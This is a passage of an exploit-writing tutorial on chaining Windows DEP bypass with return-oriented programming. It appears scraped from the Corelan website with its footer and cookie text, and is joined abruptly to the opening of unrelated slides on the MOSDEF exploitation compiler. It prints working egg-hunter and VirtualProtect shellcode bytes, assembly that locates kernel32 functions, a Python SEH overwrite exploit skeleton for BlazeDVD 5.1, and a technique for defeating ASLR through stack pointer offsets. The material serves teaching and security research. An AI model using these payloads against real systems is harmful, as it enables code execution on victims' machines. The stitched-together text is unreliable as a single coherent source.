get\nexecuted.\n[196]image\nResult :\n[197]image\nConclusion : in this ROP exploit, a different technique was used to put\nthe parameters on the stack. The parameters were first generated (using\nADD and SUB instructions) and popped into registers. Finally, a PUSHAD\ninstruction puts the instructions in the right place, and the call to\nthe API is made.\nEgghunters\nIn [198]tutorial 8, I have discussed the internals of egghunters.\nSummarizing the concept of an egg hunter, you will need to be able to\nexecute a small amount of code, which will look for the real shellcode\n(on the stack or in the heap) and execute it.\nYou should already know how to get an egg hunter to run, using rop.  An\negghunter is just some \"small\" shellcode, so you should just apply a\nrop sequence to make the egg hunter run.\nWhen the egg hunter has found the shellcode, it will jump to the base\naddress of the shellcode.  Of course, when DEP is enabled, this will\nmost likely not work.\nThat means that we need to insert a second rop chain, to make sure we\ncan mark the shellcode as executable.\nThere are 2 ways to do this :\n* append a rop routine to the egg hunter itself\n* prepend the final shellcode with a rop routine\nLet\u2019s take a look at how these 2 scenario\u2019s should be implemented,\nusing a commonly used egg hunter (using NtAccessCheckAndAuditAlarm) :\n681CAFF0F   or dx,0x0fff\n42          inc edx\n52          push edx\n6A02        push byte +0x2\n58          pop eax\nCD2E        int 0x2e\n3C05        cmp al,0x5\n5A          pop edx\n74EF        je xxxx\nB877303074  mov eax,0x74303077\n8BFA        mov edi,edx\nAF          scasd\n75EA        jnz xxxxxx\nAF          scasd\n75E7        jnz xxxxx\nFFE7        jmp edi\nAgain, I assume you already know how to get this egg hunter to run\nusing rop.\nAs you can see, at the end of this egg hunter (when the shellcode was\nfound), the address of the shellcode will be stored in edi.  The last\ninstruction of the egg hunter will jump to edi and attempt to execute\nthe shellcode.  When DEP is enabled, the jump will be made, but the\nexecution of the shellcode will fail.\nHow can we fix this ?\nScenario 1 : patch the egg hunter\nIn this first scenario, I will modify the egg hunter to make sure that\nthe location where the shellcode is located, gets marked as executable\nfirst.\nThe \"jmp edi\" instruction (which will make the jump) needs to be\nremoved.\nNext, we have to mark the memory where the shellcode is, as executable.\nWe can do this by calling VirtualProtect().  Luckily, we don\u2019t have to\nuse ROP this time, we can simply write the code in asm and append it to\nthe egg hunter. It will get executed just fine (because the current\nlocation is already executable)\nThe additional code that needs to be written, needs to craft the\nfollowing values on the stack :\n* return address : this is the address in edi \u2013 pointing to the\nshellcode. This will make sure the shellcode will get executed\nautomatically after the call to VirtualProtect() returns\n* lpAddress : same address as \"return address\"\n* size : shellcode size\n* flNewProtect : set to 0x40\n* lpflOldProtect : pointer to a writable location\nFinally it needs to call the VirtualProtect() function (making sure the\nfirst parameter is at the top of the stack), and that\u2019s it :\nsample asm code :\n[bits 32]\npush 0x10035005    ;param5 : writable address\n;0x40\nxor eax,eax\nadd al,0x40\npush eax           ;param4 : flNewProtect\n;shellcode length - use 0x300 in this example\nadd eax,0x7FFFFFBF\nsub eax,0x7FFFFCFF\npush eax         ;param3 : size : 0x300 bytes in this case\npush edi           ;param2 : lpAddress\npush edi           ;param1 : return address\npush 0x7C801AD4    ;VirtualProtect\nret\nor, in opcode :\n\"\\x68\\x05\\x50\\x03\\x10\\x31\\xc0\\x04\".\n\"\\x40\\x50\\x05\\xbf\\xff\\xff\\x7f\\x2d\".\n\"\\xff\\xfc\\xff\\x7f\\x50\\x57\\x57\\x68\".\n\"\\xd4\\x1a\\x80\\x7c\\xc3\";\nSo, basically, the entire egg hunter would look like this :\n#-------------------------------------------------------------------\n#corelanc0d3r - egg hunter which will mark shellcode loc executable\n#size to mark as executable : 300 bytes\n#writeable location : 10035005\n#XP SP3\n#-------------------------------------------------------------------\nmy $egghunter =\n\"\\x66\\x81\\xCA\\xFF\\x0F\\x42\\x52\\x6A\\x02\".\n\"\\x58\\xCD\\x2E\\x3C\\x05\\x5A\\x74\\xEF\\xB8\".\n\"\\x77\\x30\\x30\\x74\". # w00t\n\"\\x8B\\xFA\\xAF\\x75\\xEA\\xAF\\x75\\xE7\\xFF\". #no more jmp edi at the end\n#VirtualProtect\n\"\\x68\\x05\\x50\\x03\\x10\\x31\\xc0\\x04\".\n\"\\x40\\x50\\x05\\xbf\\xff\\xff\\x7f\\x2d\".\n\"\\xff\\xfc\\xff\\x7f\\x50\\x57\\x57\\x68\".\n\"\\xd4\\x1a\\x80\\x7c\\xc3\";\nThis is a small, but not really a generic egg hunter.\nSo perhaps I can make it more portable (and bigger unfortunately).  If\nsize is not really important, then this might be a generic way to make\nit work :\n(just edit the \"shellcode_size\" and \"writeable_address\" variables in\nthe asm code to match your specific exploit, and you should be ready to\nuse it)\n;----------------------------------------\n;quick and dirty asm\n;to locate VirtualProtect\n;use it to make shellcode at edi\n;executable, and jump to it\n;\n;Peter Van Eeckhoutte 'corelanc0d3r\n;http:\/\/www.corelan.be\n;----------------------------------------\n;modify these values\n;to match your environment\nshellcode_size equ 0x100\nwriteable_address equ 0x10035005\nhash_virtualprotect equ 0x7946C61B\n;\n;\n[BITS 32]\nglobal _start\n_start:\nFLDPI\nFSTENV [ESP-0xC]\npop eax\npush edi  ;save shellcode location\npush eax  ;current location\nxor edx,edx\nmov dl,0x7D   ;offset to start_main\n;skylined technique\nXOR     ECX, ECX             ; ECX = 0\nMOV     ESI, [FS:ECX + 0x30] ; ESI = &(PEB) ([FS:0x30])\nMOV     ESI, [ESI + 0x0C]    ; ESI = PEB->Ldr\nMOV     ESI, [ESI + 0x1C]    ; ESI = PEB->Ldr.InInitOrder\nnext_module:\nMOV     EAX, [ESI + 0x08]    ; EBP = InInitOrder[X].base_address\nMOV     EDI, [ESI + 0x20]    ; EBP = InInitOrder[X].module_name (unicode)\nMOV     ESI, [ESI]           ; ESI = InInitOrder[X].flink (next module)\nCMP     [EDI + 12*2], CL     ; modulename[12] == 0 ?\nJNE     next_module          ; No: try next module.\n;jmp start_main     ; replace this with relative jump forward\npop ecx\nadd ecx,edx\njmp ecx            ;jmp start_main\n;=======Function : Find function base address============\nfind_function:\npushad                           ;save all registers\nmov ebp,  [esp  +  0x24]         ;put base address of module that is being\n;loaded in ebp\nmov eax,  [ebp  +  0x3c]         ;skip over MSDOS header\nmov edx,  [ebp  +  eax  +  0x78] ;go to export table and put relative address\n;in edx\nadd edx,  ebp                    ;add base address to it.\n;edx = absolute address of export table\nmov ecx,  [edx  +  0x18]         ;set up counter ECX\n;(how many exported items are in array ?)\nmov ebx,  [edx  +  0x20]         ;put names table relative offset in ebx\nadd ebx,  ebp                    ;add base address to it.\n;ebx = absolute address of names table\nfind_function_loop:\njecxz  find_function_finished    ;if ecx=0, then last symbol has been checked.\n;(should never happen)\n;unless function could not be found\ndec ecx                          ;ecx=ecx-1\nmov esi,  [ebx  +  ecx  *  4]    ;get relative offset of the name associated\n;with the current symbol\n;and store offset in esi\nadd esi,  ebp                    ;add base address.\n;esi = absolute address of current symbol\ncompute_hash:\nxor edi,  edi                    ;zero out edi\nxor eax,  eax                    ;zero out eax\ncld                              ;clear direction flag.\n;will make sure that it increments instead of\n;decrements when using lods*\ncompute_hash_again:\nlodsb                            ;load bytes at esi (current symbol name)\n;into al, + increment esi\ntest al,  al                      ;bitwise test :\n;see if end of string has been reached\njz  compute_hash_finished        ;if zero flag is set = end of string reached\nror edi,  0xd                    ;if zero flag is not set, rotate current\n;value of hash 13 bits to the right\nadd edi,  eax                    ;add current character of symbol name\n;to hash accumulator\njmp compute_hash_again           ;continue loop\ncompute_hash_finished:\nfind_function_compare:\ncmp edi,  [esp  +  0x28]         ;see if computed hash matches requested hash\n; (at esp+0x28)\n;edi = current computed hash\n;esi = current function name (string)\njnz find_function_loop           ;no match, go to next symbol\nmov ebx,  [edx  +  0x24]         ;if match : extract ordinals table\n;relative offset and put in ebx\nadd ebx,  ebp                    ;add base address.\n;ebx = absolute address of ordinals address tab\nle\nmov cx,  [ebx  +  2  *  ecx]     ;get current symbol ordinal number (2 bytes)\nmov ebx,  [edx  +  0x1c]         ;get address table relative and put in ebx\nadd ebx,  ebp                    ;add base address.\n;ebx = absolute address of address table\nmov eax,  [ebx  +  4  *  ecx]    ;get relative function offset from its ordinal\n;and put in eax\nadd eax,  ebp                    ;add base address.\n;eax = absolute address of function address\nmov [esp  +  0x1c],  eax         ;overwrite stack copy of eax so popad\n;will return function address in eax\nfind_function_finished:\npopad                           ;retrieve original registers.\n;eax will contain function address\nret\n;-----------MAIN-------------\nstart_main:\nmov dl,0x04\nsub esp,edx      ;allocate space on stack\nmov ebp,esp      ;set ebp as frame ptr for relative offset\nmov edx,eax      ;save base address of kernel32 in edx\n;find VirtualProtect\npush hash_virtualprotect\npush edx\ncall find_function\n;VirtualProtect is in eax now\n;get shellcode location back\npop edi\npop edi\npop edi\npop edi\npush writeable_address    ;param5 : writable address\n;generate 0x40 (para4)\nxor ebx,ebx\nadd bl,0x40\npush ebx           ;param4 : flNewProtect\n;shellcode length\nadd ebx,0x7FFFFFBF  ;to compensate for 40 already in ebx\nsub ebx,0x7FFFFFFF-shellcode_size\npush ebx         ;param3 : size : 0x300 bytes in this case\npush edi         ;param2 : lpAddress\npush edi         ;param1 : return address\npush eax         ;VirtualProtect\nret\nCombined with the egg hunter itself, the code would look like this :\n#-------------------------------------------------------------------\n# corelanc0d3r - egg hunter which will mark shellcode loc executable\n# and then jumps to it\n# Works on all OSes (32bit) (dynamic VirtualProtect() lookup\n# non-optimized - can be made a lot smaller !\n#\n# Current hardcoded values :\n#  - shellcode size : 300 bytes\n#  - writeable address : 0x10035005\n#-------------------------------------------------------------------\nmy $egghunter =\n\"\\x66\\x81\\xCA\\xFF\\x0F\\x42\\x52\\x6A\\x02\".\n\"\\x58\\xCD\\x2E\\x3C\\x05\\x5A\\x74\\xEF\\xB8\".\n\"\\x77\\x30\\x30\\x74\". # w00t\n\"\\x8B\\xFA\\xAF\\x75\\xEA\\xAF\\x75\\xE7\\xFF\".\n#shellcode is now located. pointer is at edi\n#dynamic call to VirtualProtect & jump to shellcode\n\"\\xd9\\xeb\\x9b\\xd9\\x74\\x24\\xf4\\x58\".\n\"\\x57\\x50\\x31\\xd2\\xb2\\x7d\\x31\\xc9\".\n\"\\x64\\x8b\\x71\\x30\\x8b\\x76\\x0c\\x8b\".\n\"\\x76\\x1c\\x8b\\x46\\x08\\x8b\\x7e\\x20\".\n\"\\x8b\\x36\\x38\\x4f\\x18\\x75\\xf3\\x59\".\n\"\\x01\\xd1\\xff\\xe1\\x60\\x8b\\x6c\\x24\".\n\"\\x24\\x8b\\x45\\x3c\\x8b\\x54\\x05\\x78\".\n\"\\x01\\xea\\x8b\\x4a\\x18\\x8b\\x5a\\x20\".\n\"\\x01\\xeb\\xe3\\x37\\x49\\x8b\\x34\\x8b\".\n\"\\x01\\xee\\x31\\xff\\x31\\xc0\\xfc\\xac\".\n\"\\x84\\xc0\\x74\\x0a\\xc1\\xcf\\x0d\\x01\".\n\"\\xc7\\xe9\\xf1\\xff\\xff\\xff\\x3b\\x7c\".\n\"\\x24\\x28\\x75\\xde\\x8b\\x5a\\x24\\x01\".\n\"\\xeb\\x66\\x8b\\x0c\\x4b\\x8b\\x5a\\x1c\".\n\"\\x01\\xeb\\x8b\\x04\\x8b\\x01\\xe8\\x89\".\n\"\\x44\\x24\\x1c\\x61\\xc3\\xb2\\x04\\x29\".\n\"\\xd4\\x89\\xe5\\x89\\xc2\\x68\\x1b\\xc6\".\n\"\\x46\\x79\\x52\\xe8\\x9c\\xff\\xff\\xff\".\n\"\\x5f\\x5f\\x5f\\x5f\\x68\\x05\\x50\\x03\".\n\"\\x10\\x31\\xdb\\x80\\xc3\\x40\\x53\\x81\".\n\"\\xc3\\xbf\\xff\\xff\\x7f\\x81\\xeb\\xff\".\n\"\\xfe\\xff\\x7f\\x53\\x57\\x57\\x50\\xc3\";\n200 bytes is a bit large for an egg hunter, but hey, it can be\noptimized a lot (good exercise for you). On the other hand, 200 bytes\nwill fit nicely into WPM(), so you have plenty of options to make this\none work.\nTip : if you previously allocated \"fresh memory\" to get the egg\nhunter to run, then perhaps a simple memcpy of the shellcode, into\nthat same region, might work as well.\nScenario 2 : prepend the shellcode\nIf you don\u2019t have enough space to throw in the additional 28 (or about\n200 bytes for the generic version), then you can do this :\nTake out the \"jmp edi\" instruction, and replace it with \"push edi\",\n\"ret\"  (x57 xc3)\nThen, in the shellcode, between the tag (w00tw00t) and the shellcode\nitself, you will have to introduce a rop chain, which should mark the\ncurrent page as executable and run it.\nIf you understood this tutorial so far, you should know how to\nimplement this.\nUnicode\nWhat if your buffer appears to be subject to unicode ?  Well, the\nanswer is quite simple : you will need to find unicode compatible\npointers to rop gadgets.\n\"pvefindaddr rop\" will indicate if a pointer is unicode compatible\u2026\njust make sure not to use the \"nonull\" keyword for the function or you\nwon\u2019t see any unicode addresses.  It is clear thought that unicode will\ndecrease your chances on a successful exploit (because the number of\nusable pointers will be limited)\nIn addition to this, you will also need to find unicode pointers to the\nwindows API you are going to use to bypass DEP.\nGood luck !\nASLR and DEP ?\nThe theory\nBypassing DEP and ASLR at the same time will require at least one\nnon-ASLR module to be loaded. (well, that\u2019s not entirely true, but in\nmost cases (read: almost all cases), this statement will be valid)\nIf you have a module that is not ASLR enabled, then you can try to\nbuild your rop chain based on pointers from that module alone. Of\ncourse, if your rop chain uses an OS function to bypass DEP, you will\nneed to have a pointer to such a call in that module as well.\nAlexey Sintsov demonstrated this technique in his [199]ProSSHD 1.2\nexploit\nAlternatively, you need to find a pointer to the OS module somewhere on\nthe stack, in a register, etc\u2026 . If that happens, you can use rop\ngadgets from the non-aslr module to steal that value and use an offset\nto that value to get to the address of the OS function.\nThe bad news is that, if there is not a single module that is not\nsubject to ASLR, then it might be impossible to build a reliable\nexploit. (you can still try some bruteforcing etc\u2026 or find memory\nleaks\/pointers on the stack somewhere).  The good news is that\n\"pvefindaddr rop\" will automatically search for non-ASLR modules. So if\n!pvefindaddr rop shows some output, then the addresses will most likely\nbe reliable.\nIn pvefindaddr v1.34 and up, there is a function called \"ropcall\",\nwhich will search and list all interesting calls to DEP bypass\nfunctions, in the loaded modules. This may be helpful in finding an\nalternative (and perhaps ASLR bypassing) function call.\nExample : (on Easy RM to MP3 Converter, module msrmfilter03.dll) :\n[200]image\nIf you can use instructions from a non-ASLR module, and you have a\npointer to an ASLR module (OS dll for example) on the stack (or in\nmemory), then perhaps you can take advantage of that, and use an offset\nto that pointer to find\/use other usable instructions from that ASLR\nenabled module.  The base address of the module might change, but the\noffset to a certain function should remain the same.\nYou can find a nice write-up about an exploit which bypasses ASLR and\nDEP, without using a non ASLR module [201]here.\nAn example\nIn the following example, documented by mr_me, I will show a possible\ntechnique to use rop gadgets from a non ASLR compiled module to fetch\nan OS dll pointer from the stack and use an offset to that pointer to\ncalculate the address of VirtualProtect.\nIf we can find a pointer on the stack, which points to kernel32.dll,\nthen we can modify the value (add or sub an offset) until we reach the\nrelative address of VirtualProtect().\nTest environment : Vista Business SP2, English (Virtualbox).\nFor this example we will use a vulnerability in BlazeDVD Professional\n5.1, [202]discovered in august 2009.  You can download a vulnerable\ncopy of the application here :\nPlease log in to download BlazeDVD 5.1 Professional (10.6 MiB)\nThe sample code on exploit-db indicates that the SEH record is\noverwritten after 608 bytes. We already know that the 4 bytes at nseh\nat not important in a rop based sploit, so we\u2019ll build a payload that\nhas 612 bytes, and then overwrites se handler with a pointer that would\npivot control back to the stack.\nYou can run \"!pvefindaddr noaslr\" to list the modules that are not\nsubject to ASLR. You will see that most\/all application modules are not\nASLR enabled. (Of course, the Windows OS modules are ASLR enabled).\nAfter having created a rop.txt file (using \"!pvefindaddr rop nonull\"),\nand after setting a breakpoint at SEH (so we can calculate the offset\nto get back to a controlled buffer location the stack), we can conclude\nthat for example \"ADD ESP,408 + RET 4\" gadget (at 0x616074AE, from\nEPG.dll) would be a good way to start the chain.  That would make us\nland in the buffer before the seh chain, which is ok.\nNote : it will be important to avoid putting in large amounts of\ndata on the stack after overwriting SEH.  Overwriting the stack may\nalso overwrite\/push away the pointer (if any). All you need is a way\nto trigger an access violation so the overwritten SEH record would\nkick in and we can gain control over EIP.\nExploit code so far looks like this :\n#!\/usr\/bin\/python\njunk = \"A\" * 612\n## SEH - pivot the stack\nrop = 'xaex74x60x61' # 0x616074AE : # ADD ESP,408 # RETN 4\nsc = \"B\" * 500\nbuffer = junk + rop + sc\nfile=open('rop.plf','w')\nfile.write(buffer)\nfile.close()\nThe crash\/exception is triggered because we have overwritten direct RET\n(with the \"A\"\u2019s in the \"junk\" variable). (Which means that you may be\nable to build a direct RET variant for this sploit as well. Anyways, we\nalready decided to use SEH).\nWhen we observe the stack when the SE Handler is called, right after\nthe \"ADD ESP,408\" instruction is executed, we see this :\n1. We will land in the A\u2019s before overwriting SEH. Using a metasploit\npattern we discover that we land after 312 A\u2019s in that buffer. That\nmeans that your first gadget pointer needs to be placed at that\nlocation. If you will be using a lot of pointers (and\/or shellcode),\nyou may have to think about the fact that the SEH pointer is placed at\nbyte 612 in your buffer.)\n[203]image\n2. Scroll down in the stack view. After the buffer (filled with A\u2019s +\nour SEH handler + B\u2019s) you should start to see pointers on the stack,\nindicating \"RETURN to \u2026 from \u2026\" :\n[204]image\nThese are saved EIP\u2019s \u2013 placed on the stack by functions that were\ncalled earlier.\nIf you scroll almost all the way down, you will find a pointer to an\naddress in kernel32 :\n[205]image\nThe goal would be to set up a rop chain that would fetch that pointer,\nand add\/sub an offset until it points at VirtualProtect.  The pointer\nwe see on the stack, at 0x0012FF8C, is 0x7664D0E9.  In the current\nprocess\/environment, kernel32.dll is loaded at 0x76600000.\n[206]image\nVirtualProtect() is located at 0x76601DC3\n[207]image\nThat means that the VirtualProtect() function can be found at\n[kernel32_baseaddress + 0x1DC3] or, at [found_pointer \u2013 0x4B326 bytes].\nRemember this offset.\nReboot the machine and see if the pointer can still be found at the\nsame location, and that the offset from the picked up pointer from the\nstack, to VirtualProtect() is still the same.\nAfter the reboot, kernel32.dll is loaded at 0x75590000. The function is\n(obviously) still at kernel32.baseaddress offset +0x1DC3 :\n[208]image\nOn the stack, the pointer at 0012FF8C is 755DD0E9.  If we subtract the\noffset (0x4B326 bytes) again, we end up at 75591DC3. And that\u2019s\nVirtualProtect ! This means that we have found a reliable place to pick\nup a kernel32 pointer, and found a reliable offset to get to\nVirtualProtect().\nHow can we get this value from the stack into a register so we can use\nit to set up the API call ?\nWell, a possible method would be :\n* make a register point at the stack address (0x0012FF8C in this\ncase). Let\u2019s say you dynamically crafted this value into eax.\n(0x6162A59E + 0x61630804, + chain of ADD EAX,xxx )\n* use a gadget which would do something like this :  mov eax,[eax] +\nret.   This would take the kernel32 pointer and put it into eax.\n(variations on this instruction will work too, of course \u2013 example\n: MOV EAX,DWORD PTR DS:[EAX+1C] \u2013 like the one at 0x6160103B)\n* subtract 0x4B326 bytes from the value picked up from the stack\n(basically apply the static offset\u2026) and you\u2019ll have a dynamic way\nto obtain the function pointer to VirtualProtect(), on Vista SP2,\ndespite the fact that kernel32 is ASLR aware.\nNote : finding return pointers on the stack is not that uncommon, so\nthis may be a good approach to bypassing ASLR for kernel32 pointers.\nand that\u2026 would be a good exercise for you.\nGood luck !\nUpdate (June 17th) : mr_me posted his Win7 version of the DEP bypass\nexploit for BlazeDVD on [209]exploit-db.  Despite the fact that the\nexploit is available, I would still suggest to try to build this one\nyourself (on Vista or Win7 \u2013 doesn\u2019t matter\u2026 but hey, no cheating\n:D)\nOther literature on DEP \/ Memory protection bypass\n* [210]You can\u2019t stop us \u2013 CONFidence 2010 (Alexey Sintsov)\n* Buffer overflow attacks bypassing DEP Part 1 (Marco Mastropaolo)\n* Buffer overflow attacks bypassing DEP Part 2 (Marco Mastropaolo)\n* [211]Practical Rop (Dino Dai Zovi)\n* [212]Bypassing Browser Memory Protections (Alexander Sotirov & Mark\nDown)\n* [213]Return-Oriented Programming (Hovav Shacham, Erik Buchanan,\nRyan Roemer, Stefan Savage)\n* [214]Exploitation with WriteProcessMemory (Spencer Pratt)\n* [215]Exploitation techniques and mitigations on Windows (skape)\n* [216]Bypassing hardware enforced DEP (skape and skywing)\n* A little return oriented exploitation on Windows x86 \u2013 Part 1\n(Harmony Security \u2013 Stephen Fewer)\n* A little return oriented exploitation on Windows x86 \u2013 Part 2\n(Harmony Security \u2013 Stephen Fewer)\n* [217](un)Smashing the Stack (Shawn Moyer) ([218]Paper)\n* [219]http:\/\/www.usenix.org\/events\/sec09\/tech\/slides\/sotirov.pdf\n* [220]Bypassing DEP case study (Audio Converter) (sud0)\n* [221]Gentle introduction to return-oriented-programming\n* [222]DEP in depth (Syscan Singapore \u2013 InsomniaSec)\nSome good example ROP exploits can be found here :\n* ProSSHD 1.2 remote post-auth exploit\n([223]http:\/\/www.exploit-db.com\/exploits\/12495)\n* PHP 6.0 Dev str_transliterate()\n([224]http:\/\/www.exploit-db.com\/exploits\/12189)\n* VUPlayer m3u buffer overflow\n([225]http:\/\/www.exploit-db.com\/exploits\/13756)\n* Sygate Personal Firewall 5.6 build 2808 ActiveX with DEP bypass\n([226]http:\/\/www.exploit-db.com\/exploits\/13834)\n* Castripper 2.50.70 (.pls) stack buffer overflow with DEP bypass\n([227]http:\/\/www.exploit-db.com\/exploits\/13768)\nQuestions ?\nIf you\u2019ve got questions, don\u2019t hesitate to post them in my forums :\n[228]\/index.php\/forum\/exploit-writing-win32-bypass-stack-memory-protect\nions\/\nThanks to\nMy wife (for her everlasting love and support), my friends all over the\nworld, and of course the Corelan Team members.  I really couldn\u2019t have\nmade this tutorial without you guys. Learning, sharing and teamwork\npays off !\nI also would like to thank Shahin Ramezany for reviewing this document,\nand finally Dino Dai Zovi for his inspiring work, the permission to use\nsome of his diagrams in this article, and for reviewing this tutorial.\n[229]  Copyright secured by Digiprove \u00a9 2011 Peter Van Eeckhoutte\n\u00a9 2010 \u2013 2021, [230]Peter Van Eeckhoutte (corelanc0d3r). All rights\nreserved.\nSimilar\/Related posts:\n[231]Default Thumbnail Exploit writing tutorial part 1 : Stack Based\nOverflows [232]Default Thumbnail Exploit writing tutorial part 3 : SEH\nBased Exploits [233]Default Thumbnail Exploit writing tutorial part 2 :\nStack Based Overflows \u2013 jumping to shellcode [234]Default Thumbnail\nExploit writing tutorial part 3b : SEH Based Exploits \u2013 just another\nexample [235]Default Thumbnail WoW64 Egghunter\nPosted in [236]001_Security, [237]Exploit Writing Tutorials,\n[238]Exploits | Tagged [239]41414141, [240]access violation, [241]add\nesp, [242]alwaysoff, [243]alwayson, [244]aslr, [245]awe,\n[246]breakpoint, [247]bypass, [248]C0000005, [249]call, [250]code\nreuse, [251]dep, [252]dep policy, [253]egg, [254]egg hunter,\n[255]exploit, [256]exploit writing, [257]gadget, [258]heapcreate,\n[259]immunity debugger, [260]jop, [261]jump oriented programming,\n[262]memcpy, [263]ntsetinformationprocess, [264]nx, [265]offset,\n[266]optin, [267]optout, [268]pae, [269]permanent dep,\n[270]pvefindaddr, [271]register, [272]return oriented programming,\n[273]rop, [274]rop gadget, [275]setprocessdeppolicy, [276]stack,\n[277]stack pivot, [278]time-line, [279]virtualalloc,\n[280]virtualprotect, [281]WinExec, [282]writeprocessmemory, [283]xd\n14 Responses to Exploit writing tutorial part 10 : Chaining DEP with ROP \u2013\nthe Rubik\u2019s[TM] Cube\nPingback: [284]Exploiting Stack Buffer Overflows | The Blog\nPingback: [285]Hack Notes : Ropping eggs for breakfast | Corelan Team\n____________________ Search\nCorelan Training\nWe have been teaching our win32 exploit dev classes at various security\ncons and private companies & organizations since 2011\nCheck out our schedules page [286]here and sign up for one of our\nclasses now!\nDonate\nWant to support the Corelan Team community ? [287]Click here to go to\nour donations page.\nWant to donate BTC to Corelan Team?\n[donate_btc_to_corelan_thumb.png]\nYour donation will help funding server hosting.\n[INS: :INS]\nCorelan Team Merchandise\nYou can support Corelan Team by donating or purchasing items from\n[288]the official Corelan Team merchandising store.\n[289]Protected by Copyscape Web Plagiarism Tool\nCorelan on Slack\nYou can chat with us and our friends on our Slack workspace:\nGo to [290]our facebook page\nBrowse through the posts and find the invite to Slack\nUse the invite to access our Slack workspace\nActions\n* [291]Log in\n* [292]Entries feed\n* [293]Comments feed\n* [294]WordPress.org\nCategories\nCategories[Select Category_____________]\nMastodon: [295]@corelanc0d3r | [296]@corelan\nCopyright Peter Van Eeckhoutte \u00a9 2007 - 2024 | All Rights Reserved |\n[297]Terms of use\n7ads6x98y\nHi there!\nDo you like our free content? Enjoying the materials we put together?\nAre you interested in learning how to write exploits for Windows, but\nperhaps looking for updated materials?\nAre you struggling to fully grasp the concepts based on what you find\nonline? Would you perhaps prefer to learn in a classroom setting\ninstead?\nWe have good news for you!\nDid you know that we travel to strategic places around the world, to\nteach our world-renowned exploit development classes.\nIn order to preserve and ensure a top-quality learning experience, all\nof our classes are delivered in-person.\nI also teach private classes! For larger groups, I\u2019ll glady come to\nyou. For smaller groups, willing to travel to Belgium,  I\u2019ll provide a\ntraining room near Bruges.\nWe currently offer 2 classes:\nOur \u201c[298]Bootcamp\u201d classes covers the basics of exploit development\nfor Windows 11.\nThe \u201c[299]Advanced\u201d class covers heap exploitation for Windows 7,\nWindows 10 and Windows 11.\nBoth classes contain a short introduction on x64 exploitation!\nYou can find our schedules here:\n[300]https:\/\/www.corelan-training.com\/index.php\/training-schedules .\n>>> Our classes tend to sell out fast, so sign up today and secure\nyour seat in one of our classes !! <<<\nAnd if you\u2019re not sure \u2013 [301]feel free to check what our students have\nto say about our classes.\nEnjoy!\n(BUTTON) X\nWe are using cookies to give you the best experience on our website.\nYou can find out more about which cookies we are using or switch them\noff in (BUTTON) settings.\n(BUTTON) Accept\n(BUTTON) Change cookie settings\n(BUTTON) Close GDPR Cookie Settings\n* (BUTTON) Privacy Overview\n* (BUTTON) Strictly Necessary Cookies\n* (BUTTON) Cookie Policy\nPrivacy Overview\na. Corelan respects your privacy. Most information accessible on or via\nthe\nCorelan Website is available without the need to provide personal\ninformation.\nIn certain cases you may however be requested to submit personal\ninformation. In\nsuch case your personal information shall be treated in accordance with\nthe General Data Protection Regulation and any amendments hereof.\nb. All personal information made available by you will be treated\nsolely for\nthe purpose of making available to you the requested information or\nservices.\nYour personal information will not be shared with third parties, but it\nmay be used for authentication, support & marketing purposes in\nrelation with services provided by Corelan.\nc. We will only keep your personal information for as long as is\nrequired to\nprovide you with the requested information or services, or for any\nlonger period\nas may legally be required.\nd. It is our goal to reasonably protect the personal information made\navailable by you from third parties.\ne. You have the right to consult, correct, adjust or have removed your\npersonal details by written request to Corelan.  If you decide to get\nyour information removed, you understand and accept that you will lose\nall access to any resources that require the use of these personal\ndetails, such as parts of the website that require authentication.\nf. When using the Corelan Website, cookies may possible be used. You do\nnot have to accept cookies to be able to use the publicly accessible\nparts of Corelan Websites. If you have an account and you log in to\nthis site, we will set a temporary cookie to determine if your browser\naccepts cookies. This cookie contains no personal data and is discarded\nwhen you close your browser.\nWhen you log in, we will also set up several cookies to save your login\ninformation and your screen display choices.   Cookies may be used to\ndisplay advertisements or to collect statistics about the use of the\nCorelan website.\ng. This privacy policy may be amended by Corelan at any time.\nStrictly Necessary Cookies\nStrictly Necessary Cookie should be enabled at all times so that we can\nsave your preferences for cookie settings.\nEnable or Disable Cookies [ ]\nIf you disable this cookie, we will not be able to save your\npreferences. This means that every time you visit this website you will\nneed to enable or disable cookies again.\nCookie Policy\nWhen using the Corelan Website, cookies may possibly be used. You do\nnot have to accept cookies to be able to use the publicly accessible\nparts of the Corelan Website. If you have an account and you log in to\nthis site, we will set a temporary cookie to determine if your browser\naccepts cookies. This cookie contains no personal data and is discarded\nwhen you close your browser. When you log in, we will also set up\nseveral cookies to save your login information and your screen display\nchoices.\nWe may use third party cookies to show ads and to collect anonymous\ninformation such as the number of visitors to the site, and the most\npopular pages.  The ability to show ads is an important source of\nincome to cover the hosting fees to keep this website alive. If you\nprevent ads from being displayed, this website will eventually\ndisappear.\nThird party vendors, including Google, use cookies to serve ads based\non a user's prior visits to this website or other websites.\nGoogle's use of advertising cookies enables it and its partners to\nserve ads to your users based on their visit to this site and\/or other\nsites on the Internet.\n(BUTTON) Enable All (BUTTON) Save Changes"}
{"text":"MOSDEF\nDave Aitel\nImmunity, Inc\nhttp:\/\/www.immunitysec.com\n\fWho am I?\n_ Founder, Immunity, Inc. NYC based\nconsulting and products company\n\u2013 CANVAS: Exploitation Demonstration\ntoolkit\n\u2013 BodyGuard: Solaris Kernel Forensics\n\u2013 SPIKE, SPIKE Proxy: Application and\nProtocol Assessment\n_ Vulns found in:\n\u2013 RealServer, IIS, CDE, SQL Server 2000,\nWebSphere, Solaris, Windows\n\fDefinitions\n_ MOSDEF (mose-def) is short for \u201cMost\nDefinately\u201d\n_ MOSDEF is a retargetable, position\nindependent code, C compiler that\nsupports dynamic remote code linking\n_ In short, after you've overflowed a\nprocess you can compile programs to\nrun inside that process and report back\nto you\n\fWhy?\n_ To Support Immunity CANVAS\n\u2013 A sophisticated exploit\ndevelopment and demonstration\ntool\n\u2013 Supports every platform\n(potentially)\n\u2013 100% pure Python\n\fWhat's Wrong with Current\nShellcode Techniques\n_ Current Techniques\n_ Standard execve(\u201c\/bin\/sh\u201d)\n_ Or Windows CreateProcess(\u201ccmd.exe\u201d)\n_ LSD-Style assembly components\n_ Stack-transfer or \u201csyscall-redirection\u201d\n\fUnix: execve(\u201c\/bin\/sh\u201d)\n_ Does not work against chrooted() hosts\n\u2013 sometimes you cannot unchroot with\na simple shellcode\n_ Annoying to transfer files with echo,\nprintf, and uuencode\n_ Cannot easily do portforwarding or\nother advanced requirements\n\f_Windows (cmd.exe redir)\n_ Loses all current authentication tokens,\nhandles to other processes\/files, or\nother priviledged access\n_ VERY annoying to transfer files\n_ Cannot easily do portforwarding or\nother advanced requirments\n\f_Additionally\n_ Blobs of \u201cshellcode\u201d inside exploits are\nimpossible to adapt and debug\n\u2013 Going to GCC every time you want 